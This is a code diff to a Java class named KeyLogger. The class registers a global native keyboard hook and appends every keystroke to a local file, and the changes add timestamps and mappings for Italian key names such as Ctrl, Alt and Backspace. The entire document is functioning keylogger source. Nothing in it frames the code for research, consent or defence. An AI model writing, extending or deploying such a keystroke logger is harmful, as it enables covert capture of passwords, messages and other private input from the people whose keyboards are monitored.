@@ -12,6 +12,8 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
+import java.sql.Timestamp;
+import java.util.Date;
 
 /**
  * @author msolivo
@@ -26,19 +28,21 @@ public class KeyLogger implements NativeKeyListener {
 
 	//private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 	public static void main(String[] args) {
-
 		//logger.info("Key logger has been started");
 
 		init();
 
 		try {
 			GlobalScreen.registerNativeHook();
+
 		} catch (NativeHookException e) {
 			//logger.error(e.getMessage(), e);
 			System.exit(-1);
 		}
 
+		// ACTIVATE GLOBAL LINTENER
 		GlobalScreen.addNativeKeyListener(new KeyLogger());
+
 	}
 
 	private static void init() {
@@ -53,23 +57,42 @@ public class KeyLogger implements NativeKeyListener {
 
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
+
+		Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+		Date date = new Date();
+		Timestamp datetime = new Timestamp(date.getTime());
 		
-		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
-				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
-			
+		try (
+				OutputStream os = Files.newOutputStream(
+						file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND
+				);
+
+			 PrintWriter writer = new PrintWriter(os)) {
+
 			if (keyText.length() > 1) {
 				if (keyText.contains("Invio")) {
-					writer.print("\n");
+					writer.print("\n[" + datetime + "]\n");
 				} else if (keyText.contains("Barra spaziatrice")) {
 					writer.print(" ");
 				} else if (keyText.contains("Backspace")) {
-					writer.print("\n\\");
+					writer.print("#");
+				} else if (keyText.contains("Ctrl")) {
+					writer.print("[" + keyText + "]");
+				} else if (keyText.contains("Alt")) {
+					writer.print("[" + keyText + "]");
+				} else if (keyText.contains("Stamp")) {
+					writer.print("*");
+				} else if (keyText.contains("Ins")) {
+					writer.print("/");
+				} else if (keyText.contains("InvioSconosciuto keyCode: 0xe4a")) {
+					writer.print("-");
+				} else if (keyText.contains("Parentesi quadra aperta")) {
+					writer.print("è");
 				}
 			} else {
 				writer.print(keyText);
 			}
-			writer.print(keyText.toString());
-			
+
 		} catch (IOException ex) {
 			//logger.error(ex.getMessage(), ex);
 			System.exit(-1);
